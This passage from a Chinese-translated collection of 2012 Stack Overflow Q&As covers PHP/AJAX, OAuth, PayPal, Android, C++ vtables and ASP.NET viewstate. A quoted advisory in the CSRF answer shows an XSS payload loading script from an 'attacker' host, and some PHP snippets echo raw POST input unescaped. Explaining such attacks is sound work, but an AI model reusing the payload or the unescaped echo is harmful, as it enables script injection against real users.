<div id="xe"></div>

<script type="text/javascript">
document.getElementById("s").onchange = function(){
    var h = false;
    if (window.XMLHttpRequest){
        h = new XMLHttpRequest();
    }
    if (h){
        h.open("POST","index.php",true);
        h.onreadystatechange = function(){
            if (h.readyState==4 && h.status==200){
                document.getElementById("xe").innerHTML = h.responseText;
            }
        };
        h.send("s=" + document.getElementById("s").value);
    }
};
</script>

<?php
if (isset($_POST['s'])){
    echo $_POST['s'];
}
?>

</body>
</html> 
```

有任何想法吗 ？请帮忙，谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:15:04.997

实际上，`index.php`返回整个页面，其中嵌入了所有 HTML。

您可以制作另一个`partial.php`，它返回您需要在浏览器中的页面中注入的部分，并将您的 AJAX 请求指向它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T22:44:58.937

您需要将 $_POST 行放在文件顶部，然后 exit() ：

```
<?php
if (isset($_POST['s'])){
    echo $_POST['s'];
    exit;
}
?>
<html>
<head>
    <title>HI</title>
    <link rel="stylesheet" href="./scripts/css/default.css">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>

<form method="post">
<select name="s" id="s">
    <option value="one">A</option>
    <option value="two">B</option>
    <option value="three">C</option>
</select>
</form>

Hello guys ...
<div id="xe"></div>

<script type="text/javascript">
document.getElementById("s").onchange = function(){
    var h = false;
    if (window.XMLHttpRequest){
        h = new XMLHttpRequest();
    }
    if (h){
        h.open("POST","index.php",true);
        h.onreadystatechange = function(){
            if (h.readyState==4 && h.status==200){
                document.getElementById("xe").innerHTML = h.responseText;
            }
        };
        h.send("s=" + document.getElementById("s").value);
    }
};
</script>

</body>
</html> 
```

# android - 横向软键的可用高度

> ID：11603166
> 
> 赞同：0
> 
> 时间：2012-07-22T19:02:43.053
> 
> 标签：android

对于横向的 InputMethodService，Android 会自动显示一个文本框，显示通过软键输入的文本。如何获得该文本框的高度，以便我可以计算横向的可用屏幕高度？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:14:18.993

找到了！

它的工作方式相反：我可以使用我想要的屏幕高度的任何部分，然后 Android 用文本框占据剩余空间。

# oauth - oauth_token 和 oauth_verifier 参数是否足以用于持久 isLoggedIn？

> ID：11603167
> 
> 赞同：2
> 
> 时间：2012-07-22T19:03:01.823
> 
> 标签：oauth, twitter

我是第一次学习使用 twitter API。我想建立一个网站，允许用户将消息发布到他们的 twitter、facebook 和linkedin 帐户。他们需要先通过网站的注册/认证系统进行注册，该系统与 twitter、facebook 和linkedin 无关。登录后，他们应该能够将他们的 twitter、facebook 和帐户链接与我的网站同步。

我首先从 twitter 开始开发。我在这里遵循了本教程： [http ://www.1stwebdesigner.com/tutorials/twitter-app-oauth-php/](http://www.1stwebdesigner.com/tutorials/twitter-app-oauth-php/)

验证后，twitter 将我发送到此 url。

`http://mywebsite.com/?oauth_token=o7gIh4x8xAs1mcms6OKthLoLecL99WVbky2Gu6o4no&oauth_verifier=83Ip3jrMVDvnbIY3RXS5DH1FUZrWAHddwApnOBfm4`

第一次加载此页面时，它会正确检索所有经过身份验证的用户信息。但是当我刷新页面时，所有用户信息都消失了。

**我的问题是：**

查询字符串参数是否是`oauth_token=o7gIh4x8xAs1mcms6OKthLoLecL99WVbky2Gu6o4no&oauth_verifier=83Ip3jrMVDvnbIY3RXS5DH1FUZrWAHddwApnOBfm4`获得对用户 Twitter 帐户的写入权限所需的全部内容？我可以将这些令牌存储在我的数据库中，这样用户就不必再次被提示登录 Twitter 了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T22:01:05.903

您最好保留`oauth_token`（`oauth_token_secret`也）在您的数据库中，因为您将使用它们来处理您将为经过身份验证的用户执行的所有经过身份验证的请求。至于`oauth_verifier`，它是仅在 OAuth 身份验证流程期间使用的参数。因此，一旦获得最终令牌，您就可以摆脱它。

有关更多详细信息（并确保您所做的事情是正确的），请参阅 Twitter 开发人员网站上相应的“使用 Twitter 登录”页面：[https](https://dev.twitter.com/docs/auth/implementing-sign-twitter) ://dev.twitter.com/docs/auth/implementing-sign-twitter 。

# paypal - 平行预先批准的贝宝付款？

> ID：11603168
> 
> 赞同：1
> 
> 时间：2012-07-22T19:03:07.923
> 
> 标签：paypal, paypal-ipn, paypal-sandbox

我的测试服务器上的并行支付非常好，即根据我从开发人员贝宝网站下载的示例parallel.php 文件，我可以一次并行向超过1 人汇款。

我还下载了 preapproval_flow.php 文件，但在代码中，我看不到允许我设置并行支付接收器的变量/数组，甚至是单个接收器。

是否无法使用 paypal api 预先批准并行付款？

如果可能，我该怎么做？

使用直接并行付款，我可以使用以下设置付款的并行接收者：

```
$receiverEmailArray = array(
    'email0',
    'email1',
    'email2',
    'email3',
    'email4',
    'email5',
    'email6',
    'email7',
    'email8',
    'email9'
); 
```

根据[cms.paypal.com](https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_APPreapproval)和[x.com](https://www.x.com/developers/paypal/documentation-tools/api/preapproval-api-operation)， preappoval_flow 有一个名为 的选项`feesPayer`，文档说：

> 发件人 – 发件人支付所有费用（用于个人、隐式简单/**并行付款**；请勿用于链式或单边付款）

粗体字告诉我，可以进行预先批准的并行支付，但我不知道如何发送接收者......

此外，在[x.com](https://www.x.com/developers/paypal/products/adaptive-payments)上，它说：

> 开发者和商家可以结合；
> 
> *   并行和预先批准的付款。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-23T01:35:01.193

预先批准的第一步是从买方那里获得一个。

此预先批准与任何特定卖家无关，而是与 API 调用者相关，它允许您在未来进行支付 API 调用，而无需买家确认。

预批准流程是独立于支付流程的 API 调用。在其中，您可以指定要预批准的总金额、预批准有效的开始和结束日期以及一些其他参数。（有关完整规范，请参阅 Adaptive Payments 开发指南的第 8 章：[https](https://cms.paypal.com/cms_content/US/en_US/files/developer/PP_AdaptivePayments.pdf) ://cms.paypal.com/cms_content/US/en_US/files/developer/PP_AdaptivePayments.pdf ）

在此 API 调用中，您将买家重定向到 PayPal 网站，他将在该网站上批准**未来**的付款***，最高***金额为您指定的金额。（例如，如果您指定的总金额为 1000 美元，则买家可以进行 20 次 50 美元的购买，或 1 次 1000 美元的大额购买）

一旦买家批准，您就有权向他收费（以预先批准令牌的形式`PA-xxxxxxxxxxxxxx`，但此时没有钱易手。

现在您有了令牌，您可以继续进行 Parallel Payment Pay API 调用，就像您现在所做的一样，**但是**您将指定一个附加参数： `preapprovalKey=<The PA key obtained previously>`

（并且您还需要确保将`actionType`其设置为**PAY**）

一旦您进行此 API 调用，因为 PayPal 看到您已经获得了买家的许可（以批准的 PA-key 的形式），它会立即将资金转移到指定的收款人。无需重定向买家来批准此付款，因为他已经*预先*批准了它。（看到这里的逻辑了吗？）

回顾一下：

1.  调用Pre-Approval API，获取买家收费**权限**
2.  调用支付 API（包括步骤 1 中的 PA 密钥）以在给定的权限上执行

# c# - 控制台应用程序中的 SignalR Ninject（自托管）

> ID：11603178
> 
> 赞同：0
> 
> 时间：2012-07-22T19:04:01.700
> 
> 标签：c#, signalr

我正在尝试在控制台应用程序中使用 SignalR 设置 Ninject，但得到了：

> System.MissingMethodException：没有为此对象定义无参数构造函数。

我的代码如下所示：

```
static void Main(string[] args)
{
    string url = "http://localhost:8081/";
    var server = new Server(url);                        

    // Map the default hub url (/signalr)
    GlobalHost.DependencyResolver = new NinjectDependencyResolver(Kernel);            
    server.MapHubs();

    // Start the server
    server.Start(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:37:56.883

您需要在创建服务器实例之前执行此操作：

```
static void Main(string[] args)
{
    GlobalHost.DependencyResolver = new NinjectDependencyResolver(Kernel);

    string url = "http://localhost:8081/";
    var server = new Server(url);                        

    // Map the default hub url (/signalr)
    server.MapHubs();

    // Start the server
    server.Start(); 
```

或者

在服务器本身上设置依赖解析器：

```
static void Main(string[] args)
{
    string url = "http://localhost:8081/";
    var server = new Server(url, NinjectDependencyResolver(Kernel));

    server.MapHubs();

    // Start the server
    server.Start(); 
```

在后一种情况下，您将无法使用 GlobalHost 进行广播，但您可以直接使用服务器来做同样的事情。

# android - ActionBarSherlock：通过方法调用以编程方式显示/隐藏操作项按钮

> ID：11603186
> 
> 赞同：8
> 
> 时间：2012-07-22T19:05:01.593
> 
> 标签：android, android-actionbar, actionbarsherlock

我正在使用 ActionBarSherlock。我希望能够在操作栏中显示两个按钮以响应某个用户操作。用户操作与 Action Bar 完全无关。按钮的可见性需要通过调用方法来控制。此外，对单击这些按钮的响应应由我自己的应用程序代码处理。

理想情况下，按钮应该看起来就像在使用 将菜单项定义为操作项时创建的按钮一样，如此[处](http://developer.android.com/guide/topics/ui/actionbar.html#ActionItems)`android:showAsAction="ifRoom|withText"`所示。

我的问题是，据我所知，标准`ActionBar`API 没有提供这样的机制来随意显示或隐藏操作项按钮，并且唯一可以定义菜单项的时间`onCreateOptionsMenu()`当然是系统调用的时间。

我的信念是，我要添加这样的按钮并随意显示/隐藏它们的唯一方法是为它们创建自定义布局并利用`.setCustomView()`它们将它们放入操作栏中。人们通常会同意这一点，还是我错过了什么？

如果我确实使用了`.setCustomView()`，我希望我的按钮看起来与 ActionBarSherlock 为具有该属性的菜单项显示的操作项按钮相同`android:showAsAction="ifRoom|withText"`。为此，谁能告诉我我应该使用 ActionBarSherlock 库中的哪些特定主题、样式或布局？我已经尝试过使用`R.layout.abs__action_menu_item_layout`，但是尝试膨胀此布局会产生与`colorStateList`尝试膨胀`CapitalizingButton`该布局包含的 相关的异常。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-22T19:21:40.767

您可以调用`setVisibility`实例`MenuItem`。

[文档指出](http://developer.android.com/reference/android/app/Activity.html#onCreateOptionsMenu(android.view.Menu))“您可以安全地保留菜单（以及从中创建的任何项目），根据需要对其进行修改，直到下次调用 onCreateOptionsMenu()。”

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-22T19:28:42.023

如果您希望这两个按钮具有菜单项的外观和感觉，那么您应该将它们设为菜单项。您认为菜单项只能在中定义的假设`onCreateOptionsMenu()`是不正确的，因为还有一个名为 的方法[`onPrepareOptionsMenu()`](http://developer.android.com/reference/android/app/Fragment.html#onPrepareOptionsMenu%28android.view.Menu%29)，每次在菜单显示之前都会调用该方法。与活动的[`invalidateOptionsMenu()`](http://developer.android.com/reference/android/app/Activity.html#invalidateOptionsMenu%28%29)方法一起，您可以轻松创建实时反映当前状态的菜单数据。

另一种方法是保留对单个`MenuItem`对象的引用，因为文档声明其保存以保留这些对象，并在适当时更改它们的可见性。你可能仍然需要打电话`invalidateOptionsMenu()`来更新菜单——我不记得了。（**编辑：**杰克在这个上打败了我）

就个人而言，我更喜欢第一种方法，因为您将所有与菜单相关的逻辑分组在一起，并且可见性基于某种状态/模型。第二个选项可能更容易实现，具体取决于您当前的代码，但可能会导致到处都是菜单。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-22T19:29:30.443

你检查过演示样品吗？

他们在“功能切换”上有这个功能。

# android - Fragment的深拷贝

> ID：11603187
> 
> 赞同：0
> 
> 时间：2012-07-22T19:05:12.363
> 
> 标签：android, android-fragments, deep-copy

我正在使用片段类。我添加它使用

```
 FragmentTransaction fragmentTransaction =      fragmentManager.beginTransaction();

         Search fragment = new  Search(maincontrolActivity.this);

          fragmentTransaction.add(R.id.mainLayout,fragment , "MY_FRAG");
          fragmentTransaction.commit();
          this.FragmentObject = fragment 
```

当我刷新控件时，我记得这段代码但通过传递`this.FragmentObject`但我认为它是垃圾收集，因为 = 引用同一个对象，当说添加时，它释放了相同的旧片段

那么我需要深拷贝或任何方式来刷新吗？

任何想法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T18:37:57.957

好的。所以我要做的是定义一个，并在单击刷新按钮时`Interface`让每个`Fragment`寄存器都带有一个回调。`Activity`然后在片段本身中刷新其数据。如果这意味着要获取新数据，请切换到 a `ProgressBar`，从服务器获取数据，然后重新填充`View`s。[这是一篇](http://developer.android.com/training/basics/fragments/communicating.html)关于在其中创建`Interface`s并从中`Activities`调用s 的整篇文章。这大致是您的代码的`Fragment`样子......`Activity`

```
public class RefreshActivity extends Activity implements View.OnClickListener {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        findViewById(R.id.refresh_button).setOnClickListener(this);
    }

    public interface OnRefreshPressedListener {
        public void onRefreshPressed();
    }

    @Override
    public void onClick(View v) {
        ((OnRefreshPressedListener)this.FragmentObject).onRefreshPressed();
    }
} 
```

`Fragment`: _

```
public class Search extends Fragment implements OnRefreshPressedListener {

    @Override
    public void onRefreshPressed() {
        //TODO: Refresh your data!

    }

} 
```

# c# - IIS 中的 C# Metro Host WCF 服务库

> ID：11603189
> 
> 赞同：1
> 
> 时间：2012-07-22T19:05:20.640
> 
> 标签：c#, wcf, visual-studio, iis, microsoft-metro

我还有另一个恼人的 Metro/WCF 问题 :((

我有一个使用 COM 对象连接某些服务器的应用程序。我创建了 WCF 服务库，它在一个解决方案中与服务器和我的 Metro 应用程序连接。当我从 Visual Studio 调试运行它时，一切正常。

但现在我需要将我的应用程序部署到我的平板电脑上进行测试。

我在目标 PC 上成功部署了经过测试认证的 Metro 应用程序，但我不明白，如何在其上部署 WCF 服务并开始监听连接:(

我听说我可以通过在 IIS 中托管我的服务来实现这一点，但我对 IIS 非常陌生，我不明白点击什么按钮 :((( 我不知道什么是 ASP 和一种这个..

而且我想知道 - 我的应用程序客户如何在不需要部署 IIS 等的情况下运行我的应用程序......当我的应用程序进入 Windows 应用商店时。

如果有人知道如何实现我的目标，请 - 如果可以，请帮助我。

谢谢大家！！！

祝你今天过得愉快 ：）

# php - PHP 在会话过期时做一些事情

> ID：11603197
> 
> 赞同：11
> 
> 时间：2012-07-22T19:07:15.263
> 
> 标签：php

所以假设用户在我的网站上做了一些事情，例如上传了一些图片或其他什么，他没有注销就离开了，再也没有回来，或者说他确实在几个月后回来了。

所以我的问题是，是否有某种方法可以在会话过期后删除他上传的文件，比如说 30 分钟后（请记住，用户从未重新加载页面），所以这需要完全在服务器端运行完全没有用户干预。

**编辑**谢谢大家的精彩回答，它给了我很多好主意，我希望我能接受你所有的答案:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T19:15:17.413

好问题！我的第一个想法是使用基于数据库的解决方案。如果您还没有，您将在一个表中跟踪所有活动会话，`sessions`其中包含您可能需要的`session_id`和`last_visited_time`. 每次用户访问您的网站时，都会更新此条目：

```
UPDATE sessions WHERE session_id = "<current session id>" SET last_visited_time = NOW() 
```

该机制的第二部分将是一个 cronjob，它扫描`sessions`表以查找`last_visisted_time`最近没有更新的会话（在您想要的任何时间间隔内）并删除该会话的文件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-22T19:16:51.360

一种方法是打电话

```
 $thePath = session_save_path(); 
```

并遍历所有保存的会话文件，反序列化每个文件并检查它们是否具有指定的超时属性。

不幸的是，您需要**扫描整个目录**以查找所有会话文件，这些文件早于定义的时间段。您将用于`start()`计算会话文件的年龄。

在维护良好的服务器上，每个虚拟主机都应该有一个单独的目录来存放其会话数据。维护得不太好的可能会将所有会话存储在统一的共享目录中。因此，请确保您没有读取或删除其他虚拟主机的会话数据。

## 使用数据库的更好方法

因此，我建议将会**话数据保存到应用程序的后端数据库**。使用 SQL，查找所有过时的会话文件将是微不足道的。

的文档`session_set_save_handler()`提供了一个示例，它基于对象很好地[解释了整个过程。](http://www.php.net/manual/en/function.session-set-save-handler.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T22:38:57.723

I like all the answers above, but a different solution would be to name the uploaded files in a way that you know they are "temporary", for example prepending their name with a timestamp. This way, a periodic process would clean any such files, unless your program decides that they should be kept after all, renaming them accordingly.

# c++ - 多重虚拟继承中的虚拟表和内存布局

> ID：11603198
> 
> 赞同：14
> 
> 时间：2012-07-22T19:07:48.670
> 
> 标签：c++, multiple-inheritance, vtable, virtual-inheritance, memory-layout

考虑以下层次结构：

```
struct A {
   int a; 
   A() { f(0); }
   A(int i) { f(i); }
   virtual void f(int i) { cout << i; }
};
struct B1 : virtual A {
   int b1;
   B1(int i) : A(i) { f(i); }
   virtual void f(int i) { cout << i+10; }
};
struct B2 : virtual A {
   int b2;
   B2(int i) : A(i) { f(i); }
   virtual void f(int i) { cout << i+20; }
};
struct C : B1, virtual B2 {
   int c;
   C() : B1(6),B2(3),A(1){}
   virtual void f(int i) { cout << i+30; }
}; 
```

1.  实例的**确切**内存布局是什么？`C`它包含多少个 vptr，每个 vptr 的确切放置位置？哪些虚拟表与 C 的虚拟表共享？每个虚拟表究竟包含什么？

    这里我是如何理解布局的：

    ```
    ----------------------------------------------------------------
    |vptr1 | AptrOfB1 | b1 | B2ptr | c | vptr2 | AptrOfB2 | b2 | a |
    ---------------------------------------------------------------- 
    ```

    where`AptrOfBx`是指向包含`A`实例的指针`Bx`（因为继承是虚拟的）。
    那是对的吗？`vptr1`指向哪些功能？`vptr2`指向哪些功能？

2.  给定以下代码

    ```
    C* c = new C();
    dynamic_cast<B1*>(c)->f(3);
    static_cast<B2*>(c)->f(3);
    reinterpret_cast<B2*>(c)->f(3); 
    ```

    为什么所有的电话都`f`打印`33`？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-22T21:28:46.290

虚拟基地与普通基地有很大不同。请记住，“虚拟”意味着“在运行时确定”——因此必须在运行时确定整个*基础子对象。*

想象一下，您正在获得`B & x`参考，并且您的任务是找到该`A::a`成员。如果继承是真实的，则`B`有一个超类`A`，因此`B`您正在查看的 -object`x`有一个`A`-subobject，您可以在其中找到您的 member `A::a`。如果 的 派生最多的对象`x`有多个类型基`A`，那么您只能看到作为 子对象的特定副本`B`。

但是如果继承是虚拟的，那么这一切都没有意义。我们不知道我们需要*哪个* -subobject——这些信息在编译时`A`根本不*存在。*我们可以处理`B`像 in 那样的实际 -object `B y; B & x = y;`，或者`C`像 那样处理 -object `C z; B & x = z;`，或者完全不同的东西，实际上是从`A`更多次衍生而来的。唯一知道的方法是`A` *在运行时*找到实际的基础。

这可以通过多一层运行时间接来实现。（请注意，与非虚拟函数相比，这与如何使用额外的运行时间接级别实现虚拟*函数完全平行。）一种解决方案是存储指向指针的指针，而不是指向 vtable 或基本子对象**的指针。*到实际的基础子对象。这有时被称为“thunk”或“trampoline”。

所以实际的对象`C z;`可能如下所示。内存中的实际排序取决于编译器并且不重要，并且我已经抑制了 vtables。

```
+-+------++-+------++-----++-----+
|T|  B1  ||T|  B2  ||  C  ||  A  |
+-+------++-+------++-----++-----+
 |         |                 |
 V         V                 ^
 |         |       +-Thunk-+ |
 +--->>----+-->>---|     ->>-+
                   +-------+ 
```

因此，无论您有 a`B1&`还是 a `B2&`，您首先查找 thunk，然后该 thunk 会告诉您在哪里可以找到实际的基础子对象。这也解释了为什么您不能执行从 an`A&`到任何派生类型的静态转换：此信息在编译时根本不存在。

如需更深入的解释，请查看[这篇精美的文章](http://www.phpcompiler.org/articles/virtualinheritance.html)。（在那个描述中，thunk 是 vtable 的一部分`C`，并且虚拟继承总是需要维护 vtable，即使任何地方都没有虚拟*功能*。）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-07-17T20:47:02.170

我把你的代码拉了一点如下：

```
#include <stdio.h>
#include <stdint.h>

struct A {
   int a; 
   A() : a(32) { f(0); }
   A(int i) : a(32) { f(i); }
   virtual void f(int i) { printf("%d\n", i); }
};

struct B1 : virtual A {
   int b1;
   B1(int i) : A(i), b1(33) { f(i); }
   virtual void f(int i) { printf("%d\n", i+10); }
};

struct B2 : virtual A {
   int b2;
   B2(int i) : A(i), b2(34) { f(i); }
   virtual void f(int i) { printf("%d\n", i+20); }
};

struct C : B1, virtual B2 {
   int c;
   C() : B1(6),B2(3),A(1), c(35) {}
   virtual void f(int i) { printf("%d\n", i+30); }
};

int main() {
    C foo;
    intptr_t address = (intptr_t)&foo;
    printf("offset A = %ld, sizeof A = %ld\n", (intptr_t)(A*)&foo - address, sizeof(A));
    printf("offset B1 = %ld, sizeof B1 = %ld\n", (intptr_t)(B1*)&foo - address, sizeof(B1));
    printf("offset B2 = %ld, sizeof B2 = %ld\n", (intptr_t)(B2*)&foo - address, sizeof(B2));
    printf("offset C = %ld, sizeof C = %ld\n", (intptr_t)(C*)&foo - address, sizeof(C));
    unsigned char* data = (unsigned char*)address;
    for(int offset = 0; offset < sizeof(C); offset++) {
        if(!(offset & 7)) printf("| ");
        printf("%02x ", (int)data[offset]);
    }
    printf("\n");
} 
```

如您所见，这会打印出相当多的附加信息，使我们能够推断出内存布局。我机器上的输出（64 位 linux，小端字节序）是这样的：

```
1
23
16
offset A = 16, sizeof A = 16
offset B1 = 0, sizeof B1 = 32
offset B2 = 32, sizeof B2 = 32
offset C = 0, sizeof C = 48
| 00 0d 40 00 00 00 00 00 | 21 00 00 00 23 00 00 00 | 20 0d 40 00 00 00 00 00 | 20 00 00 00 00 00 00 00 | 48 0d 40 00 00 00 00 00 | 22 00 00 00 00 00 00 00 
```

因此，我们可以将布局描述如下：

```
+--------+----+----+--------+----+----+--------+----+----+
|  vptr  | b1 | c  |  vptr  | a  | xx |  vptr  | b2 | xx |
+--------+----+----+--------+----+----+--------+----+----+ 
```

这里，xx 表示填充。请注意编译器如何将变量`c`放入其非虚拟基的填充中。还要注意，所有三个 v 指针都是不同的，这允许程序推断所有虚拟碱基的正确位置。

# javascript - 这些选择器中哪个更快？

> ID：11603199
> 
> 赞同：-4
> 
> 时间：2012-07-22T19:08:00.880
> 
> 标签：javascript, jquery

在 jQuery 中，它更快。

```
//option 1
var foo = $("#myForm .myOptionList option:selected").val();

//option 2
var foo = $("#myForm").find(".myOptionList option:selected").val(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T19:14:59.050

[这](http://jsperf.com/jquery-selector-perf-right-to-left)是一个建议使用*find*和*children*的测试更快。

# asp.net - viewstate 什么时候停止 CSRF，什么时候停止？

> ID：11603202
> 
> 赞同：1
> 
> 时间：2012-07-22T19:08:18.717
> 
> 标签：asp.net, security, iis, csrf

在什么情况下，请求中的视图状态可以防止 CSRF 攻击？ [该漏洞利用](http://www.exploit-db.com/exploits/20011/)声称即使请求中存在视图状态，它仍然容易受到 CSRF 的攻击。然而，该漏洞并没有解释为什么会这样。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:43:20.377

视图状态是一种在回发（即控件的属性值）之间保持视图状态的方法。如果这种状态可以被攻击者猜到或伪造，那么攻击者也可以伪造一个真实的跨站点请求。

在[上述案例](http://www.exploit-db.com/exploits/20011/)中，似乎该攻击实际上需要一个跨站点脚本漏洞才能进行 CSRF 漏洞利用：

> 通过 XSS 和 CSRF 的组合，可以通过将 snmpd.conf 文件配置为指向攻击者控制的 JavaScript 文件来将用户添加到 Web 应用程序：
> 
> ```
> syscontact <script src="http://attacker/evil.js"></script> 
> ```

因此，在目标源内部执行利用代码，这种请求伪造攻击不再是“跨站点”。

除此之外，由于视图状态在某些情况下是可预测的，因此不能防止 CSRF 攻击，因此供应商在视图状态机制中添加了一些不可预测的信息。在 ASP.NET 中，这称为[*ViewStateUserKey*属性](http://msdn.microsoft.com/en-us/library/ms972976.aspx)，它基本上是每个用户的私钥，用于为 viewstate 的 MAC 计算加盐。

但正如漏洞描述所说，他们似乎已经在使用这样的保护措施：

> [...] NPM 也容易受到 CSRF 攻击，尽管它使用了 VIEWSTATE 保护。

因此，这又是一个跨站点脚本漏洞，而不是跨站点请求伪造漏洞。因为如果您已经能够在站点内执行 JavaScript 代码，那么您就已经完全控制了站点。

# java - 带有 unicode 换行符的注释语句

> ID：11603203
> 
> 赞同：2
> 
> 时间：2012-07-22T19:08:28.353
> 
> 标签：java, unicode, newline

让我们看一下下面的 Java 代码。

```
public class Main
{
    public static void main(String[] args)
    {
        //\u000d System.out.println("It works fine.");
    }
} 
```

在前面的代码片段中，`main()`方法内的唯一行包含一个 unicode 换行符`\u000d`. 它显示指定的消息“*它工作正常。* ”即使该行已被注释掉。它是如何工作的？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T19:10:13.820

Java 语言的一个鲜为人知的特性是 Unicode 转义序列在任何其他解析之前在源代码中的任何位置进行处理。

那是一个真正的换行符。

您甚至可以只用转义码编写整个 Java 程序。

# ravendb - RavenDb 字符串查询返回意外结果

> ID：11603205
> 
> 赞同：1
> 
> 时间：2012-07-22T19:08:44.720
> 
> 标签：ravendb, querying

我有以下代码

```
 IDocumentSession documentSession = store.OpenSession();
        var schools = documentSession.Query<School>().Where(x => x.SchoolName == "My Primary School").ToList();
        foreach (var school in schools)
        {
            Console.WriteLine(school);
        }

        schools = documentSession.Query<School>().Where(x => x.Id == "109940").ToList();
        foreach (var school in schools)
        {
            Console.WriteLine(school.SchoolName);  // returns My Primary School
        } 
```

当第一个查询运行时，虽然我在数据库中有一条匹配的记录，但没有返回任何记录。但是第二个查询返回我期望的记录。我将数据库作为嵌入式运行，我自己没有设置任何索引

更新：所以如果我自定义查询以等待非陈旧的结果它工作正常，我需要创建一个永久索引吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T05:56:56.570

这就是 RavenDB 的行为方式。如果没有索引可以满足您的查询，RavenDB 将根据查询动态创建索引，并返回陈旧的结果。

这就是为什么您第二次获得预期结果的原因。这是 RavenDB 的关键设计之一，让索引在后台完成工作并允许过时的结果，而不是阻塞查询，直到索引不再过时。

在生产中，临时索引将被提升为自动索引，一旦 RavenDB 检测到该索引有规律的使用。您还可以在某个时候创建​​静态索引，而不是中继自动索引。

# c# - Tesseract DoOcr 方法退出应用程序

> ID：11603206
> 
> 赞同：0
> 
> 时间：2012-07-22T19:09:12.220
> 
> 标签：c#, ocr, tesseract, anpr

大家好，我也是 OCR 和 Tesserect 的新手。我试图对图像进行 OCR，但是当我尝试到达此特定行时，我的应用程序一直退出

```
ocrText = ocr.DoOCR(npList[1], plateList[1]); 
```

以前它抛出一个异常，说它需要额外的配置，我更新了 App.Config 文件，但现在应用程序在这行代码处退出。

任何帮助将非常感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T15:16:25.767

设法解决这个问题，这与我的训练数据有关！

# android - 溢出菜单位置不正确

> ID：11603210
> 
> 赞同：3
> 
> 时间：2012-07-22T19:09:36.450
> 
> 标签：android, user-interface, android-4.0-ice-cream-sandwich

我使用 onCreateOptionsMenu 创建了一个溢出菜单，但该菜单几乎完全位于屏幕之外。我已经尝试`android:anyDensity="true"`明确设置（如[Action bar menu shows off screen](https://stackoverflow.com/questions/10257565/action-bar-menu-shows-off-screen)中所建议的那样），但这并没有解决我的问题。我也不想遵循使用旧主题的建议（如[ICS - 菜单项文本被截断？](https://stackoverflow.com/questions/8549755/ics-menu-item-text-cut-off)）。

截图（图片右边是物理屏幕边框，左边图片被我截掉了）：
![在此处输入图像描述](../Images/18196d6391907c6a42b29f4138160e29.png)

XML 是

```
<?xml 版本="1.0" 编码="utf-8"?>
<菜单 xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:id="@+id/menu_about"
          android:title="关于"
          android:icon="@android:drawable/ic_menu_info_details" />
    <item android:id="@+id/menu_reset"
          android:title="重置图片"
          android:icon="@android:drawable/ic_menu_revert" />
    <item android:id="@+id/menu_share"
          android:title="分享"
          android:icon="@android:drawable/ic_menu_share"
          android:showAsAction="ifRoom" />
    <item android:id="@+id/menu_facebook_logout"
          android:title="FB 注销"
          android:icon="@drawable/fbook"
          showAsAction="ifRoom" />
    <item android:id="@+id/menu_save"
          android:title="保存"
          android:icon="@android:drawable/ic_menu_save"
          android:showAsAction="ifRoom" />
    <item android:id="@+id/menu_exit"
          android:title="退出"
          android:icon="@android:drawable/ic_menu_close_clear_cancel" />
</菜单>

```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:53:43.923

原来我还有一个

```
getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                     WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);

```

在我的代码中，以避免早期 Android 版本中的错误（请参阅 [在我的应用程序中返回后再次出现标题栏](https://stackoverflow.com/questions/10112410/title-bar-apeared-again-after-coming-back-in-my-application)）。

删除它（在冰淇淋三明治中不再需要；尚未尝试其他版本）使溢出菜单正确显示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-15T06:26:04.647

检查这个确切的解决方案：

[操作栏菜单显示屏幕外](https://stackoverflow.com/questions/10257565/action-bar-menu-shows-off-screen)

似乎这些应该添加到清单中：

```
<supports-screens
        android:anyDensity="false"
        android:largeScreens="true"
        android:normalScreens="true"
        android:xlargeScreens="true"
        android:resizeable="true"
        android:smallScreens="true" /> 
```

# ios - UIGraphicsBeginImageContext 必须是 Retina 感知的？

> ID：11603212
> 
> 赞同：19
> 
> 时间：2012-07-22T19:09:51.433
> 
> 标签：ios, core-graphics, core-image

我读过一些推荐使用的帖子：

```
UIGraphicsBeginImageContextWithOptions((image.size), NO, 0.0f) 
```

代替：

```
UIGraphicsBeginImageContext(image.size). 
```

因为第一个在绘图时使用 Retina-scale，否则你会得到块状图像。

我对何时使用或不使用视网膜比例选项感到有些困惑。

如果我有一张 1000x1000 像素的照片，并且我调用 UIGraphicsBeginImageContext 传递这些尺寸，我是否没有具体指定我想绘制多少点？那样行吗？

或者我应该调用 UIGraphicsBeginImageContextWithOptions 传递一半的尺寸（500x500px）？它有什么不同吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2015-09-15T20:30:11.853

您可以像这样创建图像上下文：

```
